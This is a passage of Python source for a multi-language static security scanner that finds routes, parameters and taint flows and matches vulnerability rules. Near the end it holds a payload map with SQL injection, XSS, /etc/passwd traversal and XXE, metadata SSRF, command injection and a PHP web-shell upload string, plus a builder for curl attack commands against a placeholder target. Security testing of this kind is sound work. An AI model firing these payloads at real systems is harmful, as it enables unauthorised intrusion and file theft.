#!/usr/bin/env python3
"""
Multi-Language Security Scanner
Static analysis tool for JS/TS/PHP/Python vulnerability detection.
"""

import argparse
import json
import os
import re
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

from stackraider.core.rules import SECURITY_RULES, SecurityRule, Severity, TOTAL_RULES, RULE_CATEGORIES
from stackraider.core.rules_php import PHP_SECURITY_RULES, PHP_TOTAL_RULES, PHP_RULE_CATEGORIES
from stackraider.core.rules_python import PYTHON_SECURITY_RULES, PYTHON_TOTAL_RULES, PYTHON_RULE_CATEGORIES
from stackraider.core.rules_graphql import (
    GRAPHQL_JS_RULES, GRAPHQL_PYTHON_RULES, GRAPHQL_PHP_RULES,
    GRAPHQL_TOTAL_RULES, GRAPHQL_CATEGORIES,
)
from stackraider.core.unminify import unminify_string

# Combine all rules (GraphQL rules appended to their respective language sets)
ALL_RULES = (SECURITY_RULES + GRAPHQL_JS_RULES +
             PHP_SECURITY_RULES + GRAPHQL_PHP_RULES +
             PYTHON_SECURITY_RULES + GRAPHQL_PYTHON_RULES)
ALL_TOTAL_RULES = TOTAL_RULES + PHP_TOTAL_RULES + PYTHON_TOTAL_RULES + GRAPHQL_TOTAL_RULES
ALL_CATEGORIES = list(set(RULE_CATEGORIES + PHP_RULE_CATEGORIES + PYTHON_RULE_CATEGORIES + GRAPHQL_CATEGORIES))


# ANSI color codes for terminal output
class Colors:
    CRITICAL = "\033[91m\033[1m"  # Bold Red
    HIGH = "\033[91m"              # Red
    MEDIUM = "\033[93m"            # Yellow
    LOW = "\033[94m"               # Blue
    INFO = "\033[96m"              # Cyan
    SUCCESS = "\033[92m"           # Green
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    UNDERLINE = "\033[4m"


class _NoColors:
    """Drop-in replacement for Colors that emits no ANSI codes."""
    CRITICAL = HIGH = MEDIUM = LOW = INFO = SUCCESS = ''
    BOLD = DIM = RESET = UNDERLINE = ''


NoColors = _NoColors()


SEVERITY_COLORS = {
    Severity.CRITICAL: Colors.CRITICAL,
    Severity.HIGH: Colors.HIGH,
    Severity.MEDIUM: Colors.MEDIUM,
    Severity.LOW: Colors.LOW,
    Severity.INFO: Colors.INFO,
}


@dataclass
class RouteInfo:
    """A discovered HTTP route/endpoint in the source code."""
    method: str
    path: str
    line_start: int
    line_end: int
    params: List[Dict] = field(default_factory=list)
    auth_middleware: str = ""
    source_file: str = ""


@dataclass
class Finding:
    """Represents a security finding."""
    rule_id: str
    rule_name: str
    severity: str
    category: str
    cwe_id: str
    file_path: str
    line_number: int
    line_content: str
    context_before: List[str] = field(default_factory=list)
    context_after: List[str] = field(default_factory=list)
    description: str = ""
    exploitation: str = ""
    remediation: str = ""
    match_highlight: str = ""
    route_method: str = ""
    route_path: str = ""
    param_name: str = ""
    param_source: str = ""
    enclosing_function: str = ""


@dataclass
class ScanResult:
    """Complete scan result."""
    scan_time: str
    target_path: str
    files_scanned: int
    total_findings: int
    findings_by_severity: Dict[str, int]
    findings_by_category: Dict[str, int]
    findings: List[Finding]
    scan_duration_seconds: float
    findings_with_route: int = 0
    findings_with_param: int = 0
    all_routes: List[RouteInfo] = field(default_factory=list)


class SecurityScanner:
    """Main security scanner class."""

    SUPPORTED_EXTENSIONS = {'.js', '.ts', '.tsx', '.jsx', '.mjs', '.cjs', '.php', '.phtml', '.php3', '.php4', '.php5', '.php7', '.phps', '.inc', '.py', '.pyw'}
    
    JS_EXTENSIONS = {'.js', '.ts', '.tsx', '.jsx', '.mjs', '.cjs'}
    PHP_EXTENSIONS = {'.php', '.phtml', '.php3', '.php4', '.php5', '.php7', '.phps', '.inc'}
    PYTHON_EXTENSIONS = {'.py', '.pyw'}

    def __init__(self, target_path: str, config: Optional[Dict] = None):
        self.target_path = Path(target_path).resolve()
        self.config = config or {}
        self.findings: List[Finding] = []
        self.files_scanned = 0
        self.compiled_rules_js: List[tuple] = []
        self.compiled_rules_php: List[tuple] = []
        self.compiled_rules_python: List[tuple] = []
        self.unminify = self.config.get('unminify', False)
        self._compile_rules()

    def _compile_rules(self):
        """Pre-compile all regex patterns for performance."""
        excluded_rules = set(self.config.get('exclude_rules', []))
        min_severity = self.config.get('min_severity', 'INFO')
        severity_order = ['INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
        min_severity_idx = severity_order.index(min_severity)

        # Compile JavaScript/TypeScript rules (including GraphQL JS rules)
        for rule in SECURITY_RULES + GRAPHQL_JS_RULES:
            if rule.id in excluded_rules:
                continue
            if severity_order.index(rule.severity.value) < min_severity_idx:
                continue
            try:
                compiled = re.compile(rule.pattern, re.IGNORECASE | re.MULTILINE)
                self.compiled_rules_js.append((compiled, rule))
            except re.error as e:
                print(f"{Colors.MEDIUM}Warning: Invalid regex in rule {rule.id}: {e}{Colors.RESET}")
        
        # Compile PHP rules (including GraphQL PHP rules)
        for rule in PHP_SECURITY_RULES + GRAPHQL_PHP_RULES:
            if rule.id in excluded_rules:
                continue
            if severity_order.index(rule.severity.value) < min_severity_idx:
                continue
            try:
                compiled = re.compile(rule.pattern, re.IGNORECASE | re.MULTILINE)
                self.compiled_rules_php.append((compiled, rule))
            except re.error as e:
                print(f"{Colors.MEDIUM}Warning: Invalid regex in rule {rule.id}: {e}{Colors.RESET}")
        
        # Compile Python rules (including GraphQL Python rules)
        for rule in PYTHON_SECURITY_RULES + GRAPHQL_PYTHON_RULES:
            if rule.id in excluded_rules:
                continue
            if severity_order.index(rule.severity.value) < min_severity_idx:
                continue
            try:
                compiled = re.compile(rule.pattern, re.IGNORECASE | re.MULTILINE)
                self.compiled_rules_python.append((compiled, rule))
            except re.error as e:
                print(f"{Colors.MEDIUM}Warning: Invalid regex in rule {rule.id}: {e}{Colors.RESET}")

    def _should_scan_file(self, file_path: Path) -> bool:
        """Check if file should be scanned based on extension and exclusions."""
        if file_path.suffix.lower() not in self.SUPPORTED_EXTENSIONS:
            return False
        
        # Skip common non-source directories (unless include_vendor is enabled)
        include_vendor = self.config.get('include_vendor', False)
        skip_dirs = {'node_modules', '.git', 'dist', 'build', '.next', 'coverage', 
                     '__pycache__', '.cache', 'bower_components'}
        if not include_vendor:
            skip_dirs.add('vendor')
        if any(part in skip_dirs for part in file_path.parts):
            return False
        
        # Skip minified files
        if '.min.' in file_path.name:
            return False
        
        return True

    def _get_context_lines(self, lines: List[str], line_idx: int, context_size: int = 2) -> tuple:
        """Get context lines before and after the finding."""
        start = max(0, line_idx - context_size)
        end = min(len(lines), line_idx + context_size + 1)
        before = lines[start:line_idx]
        after = lines[line_idx + 1:end]
        return before, after

    def _is_false_positive(self, rule: SecurityRule, line: str, file_path: str,
                           lines: Optional[List[str]] = None, line_idx: int = 0) -> bool:
        """Check for common false positive patterns with context-aware filtering."""
        lower_line = line.lower()
        
        if rule.false_positive_hints:
            for hint in rule.false_positive_hints:
                if hint.lower() in lower_line:
                    return True
        
        # SSRF rule: skip when `request` or `got` is used as a data object, not an HTTP call.
        # Real HTTP calls look like: request(url), request.get(url), fetch(url), axios.post(url)
        # False positives look like: request.__typename, request.buyerDetails, got.id
        if rule.id == 'SSRF-001':
            stripped = line.strip()
            http_call_indicators = re.compile(
                r'(?:axios|fetch|needle|superagent|urllib|http\.get|https\.get|http\.request|https\.request)'
                r'\s*[\.\(]'
                r'|(?:request|got)\s*\('
                r'|(?:request|got)\s*\.\s*(?:get|post|put|delete|patch|head|options|request|defaults)\s*\('
            , re.IGNORECASE)
            if not http_call_indicators.search(stripped):
                return True

        # SQL injection: skip styled-components and other template literal non-SQL contexts
        if rule.id in ('SQL-001', 'SQL-002') and re.search(
            r'styled\s*[\(\.]|css`|html`|gql`|graphql`', line, re.IGNORECASE
        ):
            return True

        # Hardcoded credentials: skip enum/type definitions
        if rule.id == 'AUTH-003':
            enum_patterns = [
                r'=\s*[\'"]password[\'"]',
                r':\s*[\'"]password[\'"]',
                r'type\s+\w+\s*=',
                r'interface\s+\w+',
                r'enum\s+\w+',
                r'PASSWORD\s*=\s*[\'"]password[\'"]',
            ]
            for pat in enum_patterns:
                if re.search(pat, line, re.IGNORECASE):
                    return True

        # Debug mode: skip NODE_ENV-guarded checks
        if rule.id == 'CONFIG-002' and lines and line_idx > 0:
            context_range = lines[max(0, line_idx - 5):line_idx + 1]
            context_block = '\n'.join(context_range)
            if re.search(r'NODE_ENV|process\.env\.NODE_ENV|ENVIRONMENT', context_block, re.IGNORECASE):
                return True

        # Common false positive patterns
        false_positive_patterns = [
            r'^\s*//.*',
            r'^\s*/\*.*\*/',
            r'^\s*\*\s*',
            r'test[s]?/',
            r'\.test\.',
            r'\.spec\.',
            r'mock',
            r'example',
            r'sample',
        ]
        
        for pattern in false_positive_patterns:
            if re.search(pattern, lower_line) or re.search(pattern, file_path.lower()):
                if rule.severity in [Severity.CRITICAL, Severity.HIGH]:
                    return False
                pass
        
        return False

    def _is_minified(self, content: str) -> bool:
        """Heuristic to detect if code is minified."""
        lines = content.split('\n')
        if len(lines) == 0:
            return False
        
        # Check average line length - minified code has very long lines
        total_len = sum(len(line) for line in lines)
        avg_len = total_len / len(lines) if lines else 0
        
        # Check for lack of indentation
        indented_lines = sum(1 for line in lines if line.startswith('  ') or line.startswith('\t'))
        indent_ratio = indented_lines / len(lines) if lines else 0
        
        # Minified if: avg line > 200 chars OR (avg line > 100 and < 5% indented)
        return avg_len > 200 or (avg_len > 100 and indent_ratio < 0.05)

    # ── Route / endpoint discovery ──────────────────────────────────────

    _ROUTE_PATTERNS_JS = [
        re.compile(r'(?:app|router)\s*\.\s*(get|post|put|delete|patch|all|use)\s*\(\s*[\'"`]([^\'"`]+)[\'"`]', re.IGNORECASE),
        re.compile(r'server\s*\.\s*(get|post|put|delete|patch|route)\s*\(\s*[\'"`]([^\'"`]+)[\'"`]', re.IGNORECASE),
    ]
    _ROUTE_PATTERNS_PYTHON = [
        re.compile(r'@\w+\.route\s*\(\s*[\'"]([^\'"]+)[\'"](?:.*?methods\s*=\s*\[([^\]]+)\])?', re.IGNORECASE),
        re.compile(r'@\w+\.\s*(get|post|put|delete|patch)\s*\(\s*[\'"]([^\'"]+)[\'"]', re.IGNORECASE),
        re.compile(r'path\s*\(\s*[\'"]([^\'"]+)[\'"]', re.IGNORECASE),
    ]
    _ROUTE_PATTERNS_PHP = [
        re.compile(r'Route\s*::\s*(get|post|put|delete|patch|any|match)\s*\(\s*[\'"]([^\'"]+)[\'"]', re.IGNORECASE),
        re.compile(r'->\s*route\s*\(\s*[\'"]([^\'"]+)[\'"]', re.IGNORECASE),
    ]

    _PARAM_PATTERNS_JS = [
        re.compile(r'req\.query\.(\w+)'),
        re.compile(r'req\.body\.(\w+)'),
        re.compile(r'req\.params\.(\w+)'),
        re.compile(r'req\.query\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'req\.body\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'req\.params\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'req\.headers?\[\s*[\'"]([^\'"]+)[\'"]\s*\]'),
    ]
    _PARAM_PATTERNS_PYTHON = [
        re.compile(r'request\.args\.get\s*\(\s*[\'"](\w+)[\'"]'),
        re.compile(r'request\.args\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'request\.form\.get\s*\(\s*[\'"](\w+)[\'"]'),
        re.compile(r'request\.form\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'request\.json\.get\s*\(\s*[\'"](\w+)[\'"]'),
    ]
    _PARAM_PATTERNS_PHP = [
        re.compile(r'\$_GET\s*\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'\$_POST\s*\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'\$_REQUEST\s*\[\s*[\'"](\w+)[\'"]\s*\]'),
        re.compile(r'\$request\s*->\s*(?:input|get|post|query)\s*\(\s*[\'"](\w+)[\'"]'),
    ]

    _PARAM_SOURCE_MAP = {
        'req.query': 'query', 'req.body': 'body', 'req.params': 'path',
        'req.header': 'header', 'request.args': 'query', 'request.form': 'body',
        'request.json': 'body', '$_GET': 'query', '$_POST': 'body',
        '$_REQUEST': 'query', '$request': 'query',
    }

    def _find_handler_end(self, lines: List[str], start_idx: int) -> int:
        """Find the end of a route handler by brace/indent counting."""
        depth = 0
        started = False
        for i in range(start_idx, min(start_idx + 200, len(lines))):
            line = lines[i]
            for ch in line:
                if ch in ('{', '('):
                    depth += 1
                    started = True
                elif ch in ('}', ')'):
                    depth -= 1
            if started and depth <= 0:
                return i
        return min(start_idx + 50, len(lines) - 1)

    def _find_handler_end_python(self, lines: List[str], start_idx: int) -> int:
        """Find end of Python handler by dedent detection."""
        if start_idx >= len(lines):
            return start_idx
        base_indent = len(lines[start_idx]) - len(lines[start_idx].lstrip())
        for i in range(start_idx + 1, min(start_idx + 200, len(lines))):
            stripped = lines[i].strip()
            if not stripped:
                continue
            indent = len(lines[i]) - len(lines[i].lstrip())
            if indent <= base_indent and not stripped.startswith('@') and not stripped.startswith('#'):
                return i - 1
        return min(start_idx + 50, len(lines) - 1)

    def _extract_params_from_range(self, lines: List[str], start: int, end: int, file_type: str) -> List[Dict]:
        """Extract parameter access patterns within a line range."""
        params = []
        seen = set()
        block = '\n'.join(lines[start:end + 1])

        if file_type == 'js':
            patterns = self._PARAM_PATTERNS_JS
            source_defaults = ['query', 'body', 'path', 'query', 'body', 'path', 'header']
        elif file_type == 'python':
            patterns = self._PARAM_PATTERNS_PYTHON
            source_defaults = ['query', 'query', 'body', 'body', 'body']
        else:
            patterns = self._PARAM_PATTERNS_PHP
            source_defaults = ['query', 'body', 'query', 'query']

        for pat, source in zip(patterns, source_defaults):
            for m in pat.finditer(block):
                name = m.group(1)
                if name not in seen:
                    seen.add(name)
                    params.append({'name': name, 'source': source})
        return params

    def _extract_routes(self, content: str, lines: List[str], file_type: str) -> List[RouteInfo]:
        """Discover HTTP route definitions in the file."""
        routes = []

        if file_type == 'js':
            for pat in self._ROUTE_PATTERNS_JS:
                for m in pat.finditer(content):
                    method = m.group(1).upper()
                    path = m.group(2)
                    line_start = content.count('\n', 0, m.start())
                    line_end = self._find_handler_end(lines, line_start)
                    params = self._extract_params_from_range(lines, line_start, line_end, 'js')
                    routes.append(RouteInfo(method=method, path=path, line_start=line_start, line_end=line_end, params=params))

        elif file_type == 'python':
            for pat in self._ROUTE_PATTERNS_PYTHON:
                for m in pat.finditer(content):
                    groups = m.groups()
                    if pat.pattern.startswith(r'@\w+\.route'):
                        path = groups[0]
                        methods_str = groups[1] if len(groups) > 1 and groups[1] else None
                        method = 'GET'
                        if methods_str:
                            methods_str = methods_str.replace("'", "").replace('"', '').strip()
                            method = methods_str.split(',')[0].strip().upper()
                    elif pat.pattern.startswith(r'@\w+\.\s*'):
                        method = groups[0].upper()
                        path = groups[1]
                    else:
                        path = groups[0]
                        method = 'ALL'
                    line_start = content.count('\n', 0, m.start())
                    func_start = line_start + 1
                    if func_start < len(lines) and 'def ' in lines[func_start]:
                        line_end = self._find_handler_end_python(lines, func_start)
                    else:
                        line_end = self._find_handler_end_python(lines, line_start)
                    params = self._extract_params_from_range(lines, line_start, line_end, 'python')
                    routes.append(RouteInfo(method=method, path=path, line_start=line_start, line_end=line_end, params=params))

        elif file_type == 'php':
            for pat in self._ROUTE_PATTERNS_PHP:
                for m in pat.finditer(content):
                    groups = m.groups()
                    if len(groups) == 2:
                        method = groups[0].upper()
                        path = groups[1]
                    else:
                        method = 'ALL'
                        path = groups[0]
                    line_start = content.count('\n', 0, m.start())
                    line_end = self._find_handler_end(lines, line_start)
                    params = self._extract_params_from_range(lines, line_start, line_end, 'php')
                    routes.append(RouteInfo(method=method, path=path, line_start=line_start, line_end=line_end, params=params))

        return routes

    @staticmethod
    def _find_enclosing_route(line_number: int, routes: List[RouteInfo]) -> Optional[RouteInfo]:
        """Find the route whose handler range contains the given line number."""
        line_idx = line_number - 1
        for route in routes:
            if route.line_start <= line_idx <= route.line_end:
                return route
        return None

    @staticmethod
    def _find_enclosing_function(lines: List[str], line_idx: int) -> str:
        """Walk backwards to find the enclosing function/method name."""
        func_patterns = [
            re.compile(r'(?:function\s+(\w+)|(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?\(?|(\w+)\s*\(.*\)\s*\{)'),
            re.compile(r'def\s+(\w+)\s*\('),
            re.compile(r'(?:public|private|protected)?\s*function\s+(\w+)\s*\('),
        ]
        for i in range(line_idx, max(line_idx - 50, -1), -1):
            if i >= len(lines):
                continue
            for pat in func_patterns:
                m = pat.search(lines[i])
                if m:
                    name = next((g for g in m.groups() if g), None)
                    if name:
                        return name
        return ""

    _AUTH_MIDDLEWARE_PATTERNS = [
        re.compile(r'(?:requireAuth|isAuthenticated|authenticate|authMiddleware|ensureAuth|requireLogin|checkAuth|verifyToken|passport\.authenticate|isLoggedIn|requireSignin|protect)\s*[\(,\)]', re.IGNORECASE),
        re.compile(r'@login_required|@requires_auth|@jwt_required|@token_required|@auth\.requires|@permission_required', re.IGNORECASE),
        re.compile(r'->middleware\s*\(\s*[\'"]auth[\'"]|->middleware\s*\(\s*[\'"]verified[\'"]', re.IGNORECASE),
    ]

    def _detect_auth_middleware(self, lines: List[str], line_start: int) -> str:
        """Check if a route handler has auth middleware applied."""
        check_range = lines[max(0, line_start - 2):line_start + 2]
        block = '\n'.join(check_range)
        for pat in self._AUTH_MIDDLEWARE_PATTERNS:
            m = pat.search(block)
            if m:
                return m.group(0).strip().rstrip('(,)')
        return ""

    def scan_file(self, file_path: Path) -> Tuple[List[Finding], List[RouteInfo]]:
        """Scan a single file for vulnerabilities. Returns (findings, routes)."""
        findings = []
        
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            
            file_ext = file_path.suffix.lower()
            is_js = file_ext in self.JS_EXTENSIONS
            is_php = file_ext in self.PHP_EXTENSIONS
            is_python = file_ext in self.PYTHON_EXTENSIONS
            
            if is_js and self.unminify and self._is_minified(content):
                try:
                    content = unminify_string(content)
                except Exception:
                    pass
            
            lines = content.split('\n')
        except Exception as e:
            print(f"{Colors.DIM}  Skipping {file_path}: {e}{Colors.RESET}")
            return findings, []

        # Phase 1: Route discovery
        file_type = 'js' if is_js else ('python' if is_python else 'php')
        routes = self._extract_routes(content, lines, file_type)
        for route in routes:
            route.source_file = str(file_path)
            route.auth_middleware = self._detect_auth_middleware(lines, route.line_start)

        # Phase 2: Vulnerability scan
        if is_php:
            compiled_rules = self.compiled_rules_php
        elif is_python:
            compiled_rules = self.compiled_rules_python
        else:
            compiled_rules = self.compiled_rules_js

        for compiled_pattern, rule in compiled_rules:
            for match in compiled_pattern.finditer(content):
                line_start = content.count('\n', 0, match.start())
                line_content = lines[line_start] if line_start < len(lines) else ""
                
                if self._is_false_positive(rule, line_content, str(file_path), lines, line_start):
                    continue
                
                context_before, context_after = self._get_context_lines(lines, line_start, context_size=3)
                
                finding = Finding(
                    rule_id=rule.id,
                    rule_name=rule.name,
                    severity=rule.severity.value,
                    category=rule.category,
                    cwe_id=rule.cwe_id,
                    file_path=str(file_path),
                    line_number=line_start + 1,
                    line_content=line_content.strip(),
                    context_before=[l.strip() for l in context_before],
                    context_after=[l.strip() for l in context_after],
                    description=rule.description,
                    exploitation=rule.exploitation,
                    remediation=rule.remediation,
                    match_highlight=match.group(0)[:100],
                )

                # Enrich with route context
                route = self._find_enclosing_route(line_start + 1, routes)
                if route:
                    finding.route_method = route.method
                    finding.route_path = route.path
                    if route.params:
                        finding.param_name = route.params[0]['name']
                        finding.param_source = route.params[0]['source']

                # If no param from route, try wider context inference
                if not finding.param_name:
                    inferred = _infer_injection_point_wide(lines, line_start, route)
                    if inferred:
                        finding.param_name = inferred[1]
                        finding.param_source = inferred[0]

                finding.enclosing_function = self._find_enclosing_function(lines, line_start)

                findings.append(finding)
        
        return findings, routes

    def scan(self, max_workers: int = 4) -> ScanResult:
        """Recursively scan target path for vulnerabilities."""
        start_time = datetime.now()
        files_to_scan: List[Path] = []
        
        # Collect files to scan
        if self.target_path.is_file():
            if self._should_scan_file(self.target_path):
                files_to_scan.append(self.target_path)
        else:
            for file_path in self.target_path.rglob('*'):
                if file_path.is_file() and self._should_scan_file(file_path):
                    files_to_scan.append(file_path)
        
        if not self.config.get('quiet'):
            print(f"\n{Colors.BOLD}🔍 Scanning {len(files_to_scan)} files...{Colors.RESET}\n")
        
        # Scan files in parallel
        all_findings: List[Finding] = []
        all_routes: List[RouteInfo] = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_file = {executor.submit(self.scan_file, f): f for f in files_to_scan}
            for future in as_completed(future_to_file):
                file_findings, file_routes = future.result()
                if file_findings:
                    all_findings.extend(file_findings)
                if file_routes:
                    all_routes.extend(file_routes)
                self.files_scanned += 1
        
        # Sort findings by severity (critical first)
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
        all_findings.sort(key=lambda f: (severity_order.get(f.severity, 5), f.file_path))
        
        # Calculate statistics
        findings_by_severity = defaultdict(int)
        findings_by_category = defaultdict(int)
        with_route = 0
        with_param = 0
        for finding in all_findings:
            findings_by_severity[finding.severity] += 1
            findings_by_category[finding.category] += 1
            if finding.route_path:
                with_route += 1
            if finding.param_name:
                with_param += 1
        
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        
        return ScanResult(
            scan_time=start_time.isoformat(),
            target_path=str(self.target_path),
            files_scanned=self.files_scanned,
            total_findings=len(all_findings),
            findings_by_severity=dict(findings_by_severity),
            findings_by_category=dict(findings_by_category),
            findings=all_findings,
            scan_duration_seconds=duration,
            findings_with_route=with_route,
            findings_with_param=with_param,
            all_routes=all_routes,
        )


# ── Wider-context parameter inference ──────────────────────────────────

_INJECTION_POINT_PATTERNS = [
    (r'\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\]', 'query'),
    (r'\$_POST\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\]', 'body'),
    (r'\$_REQUEST\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\]', 'query'),
    (r'\$_COOKIE\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\]', 'cookie'),
    (r'\$_SERVER\s*\[\s*[\'"]HTTP_([^\'"]+)[\'"]\s*\]', 'header'),
    (r'req\.query\.(\w+)', 'query'),
    (r'req\.query\[\s*[\'"](\w+)[\'"]\s*\]', 'query'),
    (r'req\.body\.(\w+)', 'body'),
    (r'req\.body\[\s*[\'"](\w+)[\'"]\s*\]', 'body'),
    (r'req\.params\.(\w+)', 'path'),
    (r'req\.params\[\s*[\'"](\w+)[\'"]\s*\]', 'path'),
    (r'req\.(?:headers|get)\s*\(\s*[\'"]([^\'"]+)[\'"]\s*\)', 'header'),
    (r'req\.headers\[[\'"]([^\'"]+)[\'"]\]', 'header'),
    (r'request\.args\.get\s*\(\s*[\'"]([^\'"]+)[\'"]', 'query'),
    (r'request\.args\[\s*[\'"]([^\'"]+)[\'"]\s*\]', 'query'),
    (r'request\.form(?:\.get)?\s*\(\s*[\'"]([^\'"]+)[\'"]', 'body'),
    (r'request\.form\[[\'"]([^\'"]+)[\'"]\]', 'body'),
    (r'request\.headers(?:\.get)?\s*\(\s*[\'"]([^\'"]+)[\'"]', 'header'),
    (r'request\.headers\[[\'"]([^\'"]+)[\'"]\]', 'header'),
    (r'\$request\s*->\s*(?:input|get|post|query)\s*\(\s*[\'"](\w+)[\'"]', 'query'),
]


def _infer_injection_point_wide(
    lines: List[str], line_idx: int, route: Optional[RouteInfo] = None
) -> Optional[Tuple[str, str]]:
    """Infer (source_type, param_name) from a wide context window (20 lines) or the enclosing route."""
    start = max(0, line_idx - 20)
    end = min(len(lines), line_idx + 21)
    context = '\n'.join(lines[start:end])

    for pattern, source_type in _INJECTION_POINT_PATTERNS:
        m = re.search(pattern, context)
        if m:
            param = m.group(1)
            if source_type == 'header':
                param = param.replace('_', '-').title()
            return (source_type, param)

    if route:
        route_block = '\n'.join(lines[route.line_start:route.line_end + 1])
        for pattern, source_type in _INJECTION_POINT_PATTERNS:
            m = re.search(pattern, route_block)
            if m:
                param = m.group(1)
                if source_type == 'header':
                    param = param.replace('_', '-').title()
                return (source_type, param)

    return None


# ── Payload map for injection categories ────────────────────────────────

_PAYLOAD_BY_RULE: Dict[str, str] = {
    'PHP-SSTI-001': '{{7*7}}',
    'PHP-SSTI-002': '{{7*7}}',
    'PHP-SSTI-003': "{{ system('id') }}",
    'PY-FLASK-002': '{{7*7}}',
    'SSTI-001': '{{7*7}}',
}

_PAYLOAD_BY_CATEGORY: Dict[str, str] = {
    'Template Injection': '{{7*7}}',
    'SQL Injection': "' OR 1=1--",
    'NoSQL Injection': "' || 1==1//",
    'Command Injection': '; id',
    'Code Injection': '{{7*7}}',
    'LDAP Injection': '*)(uid=*))(|(uid=*',
    'Cross-Site Scripting': '<script>alert(1)</script>',
    'Path Traversal': '../../../etc/passwd',
    'File Inclusion': '../../../etc/passwd',
    'LFI': '../../../etc/passwd',
    'Server-Side Request Forgery': 'http://169.254.169.254/',
    'Insecure Deserialization': 'O:8:"stdClass":0:{}',
    'XML External Entity': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>',
    'XXE': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>',
    'Open Redirect': '//evil.com',
    'Header Injection': 'evil.com\\r\\nSet-Cookie: session=xxx',
    'Host Header Injection': 'evil.com',
    'Authentication': "admin' OR '1'='1",
    'Authentication Bypass': '?admin=1',
    'Privilege Escalation': '?debug=1',
    'File Upload': '<?php system($_GET["c"]);?>',
    'Content Injection': '<script>alert(1)</script>',
    'Input Handling': "' OR 1=1--",
    'Prototype Pollution': '__proto__[polluted]=true',
    'Mass Assignment': '{"isAdmin":true}',
    'Remote Code Execution': '; id',
    'GraphQL Misconfiguration': '{__schema{types{name,fields{name}}}}',
    'GraphQL DoS': '{ a1: __typename a2: __typename a3: __typename }',
    'GraphQL Authorization': '{ user(id: "1") { name email role } }',
}

_NON_INJECTION_CATEGORIES: Dict[str, str] = {
    'Information Disclosure': 'Extract the disclosed value and test against discovered endpoints.',
    'Misconfiguration': 'Verify this setting is active in the running application.',
    'Security Misconfiguration': 'Verify this setting is active in the running application.',
    'Weak Cryptography': 'Check if this hash/cipher is used for security-sensitive operations.',
    'Insecure Randomness': 'Check if predictable values are used for tokens, sessions, or secrets.',
    'Hardcoded Secrets': 'Extract the credential value and test it against discovered login endpoints.',
    'Session Management': 'Inspect session cookies for secure/httpOnly flags and fixation.',
    'CSRF': 'Verify anti-CSRF tokens are present and validated on state-changing requests.',
    'Denial of Service': 'Send oversized or deeply nested input to the identified endpoint.',
}


_SANITIZATION_PATTERNS = re.compile(
    r'sanitize|escape|encode|validate|parseInt|parseFloat|Number\(|encodeURI|'
    r'htmlspecialchars|htmlentities|addslashes|mysql_real_escape|pg_escape|'
    r'strip_tags|filter_var|preg_replace|intval|ctype_|is_numeric|'
    r'bleach\.clean|markupsafe|Markup\(|DOMPurify|createTextNode|'
    r'parameterize|placeholder|prepared|bindParam|bindValue|'
    r'validator\.|Joi\.|yup\.|zod\.',
    re.IGNORECASE,
)


def _trace_taint_flow(
    lines: List[str], sink_idx: int, param_name: str, param_source: str,
) -> Optional[Dict]:
    """Intra-function taint trace from source to sink.

    Returns dict with keys: source_line, sink_line, flow (list of
    (line_no, text, annotation) tuples), sanitized (bool).
    """
    search_start = max(0, sink_idx - 40)
    source_idx = None
    source_text = ''

    # Find the source line (where the param is read from request)
    for i in range(sink_idx, search_start - 1, -1):
        if i >= len(lines):
            continue
        if param_name in lines[i]:
            for pat_str, _ in _INJECTION_POINT_PATTERNS:
                if re.search(pat_str, lines[i]):
                    source_idx = i
                    source_text = lines[i].strip()
                    break
            if source_idx is not None:
                break

    if source_idx is None:
        return None

    # Identify the variable the source is assigned to
    var_name = None
    assign_match = re.search(
        r'(?:const|let|var|)\s*(\w+)\s*=|(\w+)\s*=\s*',
        lines[source_idx],
    )
    if assign_match:
        var_name = assign_match.group(1) or assign_match.group(2)

    # Walk lines between source and sink
    flow: List[Tuple[int, str, str]] = []
    flow.append((source_idx + 1, source_text, 'SOURCE'))
    sanitized = False

    for i in range(source_idx + 1, sink_idx):
        if i >= len(lines):
            break
        line = lines[i].strip()
        if not line or line.startswith('//') or line.startswith('#'):
            continue
        relevant = (var_name and var_name in line) or param_name in line
        if not relevant:
            continue
        annotation = ''
        if _SANITIZATION_PATTERNS.search(line):
            annotation = 'SANITIZED'
            sanitized = True
        flow.append((i + 1, line, annotation))

    flow.append((sink_idx + 1, lines[sink_idx].strip(), 'SINK'))

    return {
        'source_line': source_idx + 1,
        'sink_line': sink_idx + 1,
        'flow': flow,
        'sanitized': sanitized,
    }


def _get_payload(rule_id: str, category: str) -> Optional[str]:
    return _PAYLOAD_BY_RULE.get(rule_id) or _PAYLOAD_BY_CATEGORY.get(category)


def _format_curl(method: str, path: str, param_name: str, source: str, payload: str) -> str:
    """Build a concrete curl command from known route/param/payload."""
    from urllib.parse import quote
    encoded = quote(payload, safe='')
    target_path = path or '<path>'

    if source in ('query', 'get', 'request'):
        return f'curl "http://TARGET{target_path}?{param_name}={encoded}"'
    if source in ('body', 'post'):
        m = method if method and method != 'ALL' else 'POST'
        return f'curl -X {m} -d "{param_name}={encoded}" http://TARGET{target_path}'
    if source == 'cookie':
        return f'curl -H "Cookie: {param_name}={encoded}" http://TARGET{target_path}'
    if source == 'header':
